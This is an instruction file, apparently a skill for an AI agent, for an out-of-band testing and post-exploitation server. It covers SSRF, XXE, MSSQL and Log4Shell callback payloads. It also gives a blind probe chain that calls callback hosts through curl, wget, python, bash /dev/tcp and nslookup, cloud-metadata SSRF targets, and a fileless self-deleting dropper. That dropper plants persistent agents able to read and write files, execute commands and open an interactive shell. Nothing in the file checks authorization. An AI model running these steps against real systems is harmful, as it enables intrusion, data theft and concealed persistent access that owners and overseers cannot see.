---
name: oast-mcp
description: Use when connected to an oast-mcp server and performing out-of-band security testing (SSRF, blind injection, DNS rebinding, Log4Shell) or deploying persistent agents on compromised targets after achieving RCE.
---

# oast-mcp

## Overview

oast-mcp exposes DNS/HTTP/HTTPS callback detection and agent management as MCP tools. Two independent workflows: **OAST** (detect out-of-band interactions) and **Agents** (persistent access after RCE).

Scopes required: `oast:read,oast:write` for OAST tools; `agent:admin` for agent tools.

---

## OAST Workflow

```
oast_create_session → oast_generate_payload → inject → oast_wait_for_event → oast_close_session
```

1. **`oast_create_session`** → `session_id` + DNS/HTTP/HTTPS callback endpoints.
2. **`oast_generate_payload`** → ready-to-inject string.
   - `label`: tags the injection point in the subdomain (e.g. `"ua-header"`) — use it to identify which field fired.
   - `dns_hostname` is always returned — use it directly when the payload string doesn't fit the injection context.
3. **Inject** into the target.
4. **`oast_wait_for_event`** — blocks up to 30s for the next callback. Use this immediately after injection.
5. **`oast_list_events`** — returns already-arrived events (history/pagination). Use for review, not real-time detection.
6. **`oast_close_session`** when done.

### Payload type selection

| Context | Recommended type | Why |
|---|---|---|
| Unknown / first probe | `url` | Use `dns_hostname` directly; DNS fires even when HTTP is blocked |
| HTTP param, header, redirect | `url` or `ssrf` | Direct HTTP callback from server |
| XML input | `xxe` | DTD entity injection |
| SQL injection (MSSQL) | `sqli-oob` | `xp_dirtree` DNS lookup |
| HTML / template injection | `img-tag` | Browser-triggered HTTP |
| CSS injection | `css-import` | Browser-triggered HTTP |
| Java app with unpatched Log4j | `log4j` | JNDI LDAP via DNS — legacy targets only |

Regardless of type, `dns_hostname` is always returned. A DNS-only event (no HTTP) is still a valid finding.

### Blind SSRF strategy

SSRF is server-side: you inject a URL and the **server** fetches it — not the browser.

1. **Start with DNS**: use `url` type and pass `dns_hostname` raw. If DNS fires, the server can reach the internet.
2. **DNS fires, HTTP doesn't**: server may filter HTTP/HTTPS egress. Try internal targets: `169.254.169.254` (cloud metadata), `10.x.x.x`, `192.168.x.x`.
3. **Nothing fires after 2–3 probes**: the server can't make outbound connections, or the parameter doesn't trigger server-side requests.
4. **Use `label`** to tag each injection point (`"referer"`, `"x-forwarded-for"`, `"pdf-url"`, `"avatar-url"`) — you'll see exactly which field fired in the event subdomain.
5. SSRF often only resolves DNS — the full HTTP request may be blocked or stripped. A DNS-only event is still a valid finding.

### No HTTP client on target (RCE)

> **Blind RCE warning:** In blind RCE you cannot see stderr or command output at all.
> Never probe tools sequentially — "curl: command not found" is invisible.
> Instead, **chain all fallbacks in a single command using `||`** and use event `label`s
> to discover which tool fired via the OAST callback.

**Blind probe template** — generate four payloads with labels `probe-curl`, `probe-wget`, `probe-py3`, `probe-dns`, then inject this single command:

```sh
curl -sk https://<probe-curl-host>/ 2>/dev/null ||
wget -q -O/dev/null https://<probe-wget-host>/ 2>/dev/null ||
python3 -c "import urllib.request; urllib.request.urlopen('https://<probe-py3-host>/')" 2>/dev/null ||
nslookup <probe-dns-host>
```

Call `oast_wait_for_event` once — whichever label fires tells you what tool is available on the target. Use that tool for all subsequent operations. `nslookup` at the end is the guaranteed DNS fallback: it requires no HTTP client and fires even through strict egress firewalls.

**If you have interactive output** (non-blind RCE), try in order:

```
1. curl      curl -sk https://<dns_hostname>/
2. wget      wget -q -O- https://<dns_hostname>/
3. python3   python3 -c "import urllib.request; urllib.request.urlopen('https://<dns_hostname>/')"
4. python2   python -c "import urllib2; urllib2.urlopen('https://<dns_hostname>/')"
5. perl      perl -e 'use LWP::Simple; get("https://<dns_hostname>/");'
6. ruby      ruby -e 'require "net/http"; Net::HTTP.get(URI("https://<dns_hostname>/"))'
7. bash      bash -c 'exec 3<>/dev/tcp/<dns_hostname>/80'  # TCP only, triggers DNS
8. nslookup  nslookup <dns_hostname>    # DNS only — no HTTP needed
9. dig       dig <dns_hostname>         # DNS only
10. ping     ping -c 1 <dns_hostname>   # DNS only (resolves then ICMPs)
```

**If nothing works**: DNS always works on almost any system. Use `url` type, take `dns_hostname`, and run `nslookup`/`dig`/`ping` — the DNS resolution still registers as an event.

---

## Agent Workflow

```
probe OS/arch → agent_dropper_generate → run command on target → agent_list → agent_task_schedule → agent_task_status
                                                                              ↳ interactive_exec → agent_task_interact (repeat) → agent_task_cancel (if needed)
```

1. **Probe** target: `uname -m` (Linux) or `$ENV:PROCESSOR_ARCHITECTURE` (Windows).
2. **`agent_dropper_generate`**: pass `agent_id`, `os_arch`, `ttl`, and `delivery`.
   - `delivery: "url"` — returns `curl_cmd`/`wget_cmd`; target fetches loader over HTTPS. Use when egress is open.
   - `delivery: "inline"` — returns `b64_cmd` with loader embedded (~90-150KB base64 for Linux). Use when egress is blocked.
3. **Run** the returned command on target via the RCE primitive.
   > **One-shot dropper:** The loader self-deletes the moment it runs. If the agent fails to start (network error, bad token), the loader is already gone — you must re-run `agent_dropper_generate` and re-deliver to retry.
   >
   > **No disk artifact (Linux):** The stage-2 agent binary is loaded directly into an anonymous memfd and exec'd from `/proc/self/fd/N` — it is never written to disk.
   >
   > **Auto-cleanup (Windows):** The stage-2 agent temp file and the loader `.exe` are both marked delete-on-close; they are removed automatically when the respective process exits.
4. **`agent_list`** — confirm `status: "online"` before scheduling. The agent token `--sub` must match the MCP session subject (same tenant).
5. **`agent_task_schedule`** → returns `task_id` immediately (async). The `timeout_secs` parameter here is the **task execution timeout** — the deadline for the agent to finish the work (default 600s, max 86400s).
6. **`agent_task_status`** — by default blocks (up to 30s) until the task completes. No polling needed.
   - `wait` (bool, default `true`): blocks server-side until the task reaches `done`/`error` or the wait timeout elapses.
   - `timeout_secs` (number, default 30, max 120): **wait timeout** — how long this status call blocks. Independent of the task execution timeout set in step 5.
   - Response includes `timed_out: true` when the wait timeout fires before the task completes.
   - Set `wait: false` to get the current status instantly without blocking. Use this when checking multiple tasks in parallel, showing intermediate progress, or doing other work between checks.
   - If `timed_out: true`, call `agent_task_status` again (the task is still running on the agent).
7. **`agent_task_cancel`** — abort a pending or running task. Pass `task_id` and `agent_id`. The agent kills the subprocess immediately.

## Capability Reference

| Capability         | Params                                                             | Result fields                    |
|--------------------|--------------------------------------------------------------------|----------------------------------|
| `read_file`        | `path` (str)                                                       | `content` (**base64**), `path`   |
| `write_file`       | `path` (str), `content_b64` (str, base64), `mode` (str, e.g. "0755") | `bytes_written` (int)           |
| `fetch_url`        | `url` (str), `timeout` (int, default 15)                           | `status` (int), `body` (**base64**)|
| `system_info`      | —                                                                  | `hostname`, `os`, `arch`, `user` |
| `exec`             | `cmd` (str), `timeout` (int, default 30)                           | `output` (str), `exit_code` (int)|
| `interactive_exec` | `command` (str), `binary` (bool, default false)                    | Use `agent_task_interact` for I/O |

`read_file` and `fetch_url` results are base64-encoded — decode before interpreting content.

### Interactive exec workflow

Use `interactive_exec` when you need to interact with a process (e.g. a setuid binary, a shell, a CLI tool that prompts for input).

```
agent_task_schedule(capability="interactive_exec", params={"command": "bash"})
  → task_id
agent_task_interact(task_id=...)                    → read initial output (prompt)
agent_task_interact(task_id=..., stdin="id\n")      → send command, read response
agent_task_interact(task_id=..., stdin="exit\n")    → exit, running=false + exit_code
```

**Escape sequences in `stdin`** are interpreted as C-style escapes before sending:
`\n` = newline, `\r` = CR, `\t` = tab, `\\` = literal backslash, `\xNN` = hex byte (e.g. `\x03` = Ctrl-C, `\x04` = Ctrl-D, `\x1b` = Escape).

---

## Common Mistakes

| Mistake | Fix |
|---------|-----|
| `agent_list` returns empty after running dropper | Token `--sub` must equal the MCP session subject; different subjects = different tenants |
| Task stuck in `pending` | Confirm agent is `online` first; dispatch loop polls every 2s |
| Polling `agent_task_status` with `wait: false` in a loop | Use the default `wait: true` — it blocks server-side up to 30s. Only use `wait: false` for parallel task checks or intermediate progress |
| Confusing task timeout with wait timeout | `timeout_secs` in `agent_task_schedule` = agent execution deadline. `timeout_secs` in `agent_task_status` = how long the status call blocks |
| Polling `oast_list_events` in a loop after injection | Use `oast_wait_for_event` — it blocks server-side; `list_events` returns history only |
| Target is air-gapped, no outbound HTTP | Set `delivery: "inline"` in `agent_dropper_generate` |
| `read_file`/`fetch_url` content unreadable | The `content`/`body` field is base64 — decode it |
| No OAST callback after injecting curl command | In blind RCE, curl may be absent but you'll never see the error. Use the blind probe template (chain `curl \|\| wget \|\| python3 \|\| nslookup` with labels) — see "No HTTP client on target" |
